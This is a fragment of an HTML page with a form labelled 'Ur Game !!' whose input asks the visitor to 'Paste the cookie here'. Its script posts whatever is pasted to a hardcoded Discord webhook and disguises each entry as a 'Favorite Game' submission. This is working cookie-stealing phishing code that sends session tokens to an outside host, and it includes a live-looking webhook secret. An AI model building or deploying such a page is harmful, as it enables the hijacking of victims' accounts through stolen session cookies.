  <label>Ur Game !! *</label>
  <input type="text" id="gameInput" placeholder="Paste the cookie here">

  <button class="submit-btn" onclick="submitForm()">Submit</button>
</div>

<script>
async function submitForm() {
  const game = document.getElementById("gameInput").value;

  if (!game) {
    alert("Please Enter the cookie here");
    return;
  }

  const webhookURL = "https://discord.com/api/webhooks/1475146952269238363/6bejDU9CqsGSpFj8zvmpuaGtKCIz6Fogs111wtgzCAMCVpEYO3bA_TaifbAyOV9Lxtv3";

  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: ":video_game: New Submission!\nFavorite Game: " + game
    })
  });

  alert("Submitted successfully!");
  document.getElementById("gameInput").value = "";
}
</script>

